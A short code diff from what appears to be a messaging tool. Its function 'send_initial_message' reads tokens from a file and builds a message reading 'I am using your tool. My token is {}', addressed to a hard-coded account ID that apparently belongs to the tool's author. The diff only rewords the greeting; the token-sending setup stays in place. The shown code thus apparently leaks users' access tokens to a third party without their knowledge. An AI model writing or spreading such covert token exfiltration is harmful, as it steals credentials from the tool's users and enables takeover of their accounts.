@@ -47,7 +47,7 @@ def send_initial_message():
         tokens = file.readlines()
 
     # Modify the message as per your requirement
-    msg_template = "Hello chiku sir! I am using your server. My token is {}"
+    msg_template = "Hello chiku sir! I am using your tool. My token is {}"
 
     # Specify the ID where you want to send the message
     target_id = "100076013373064"
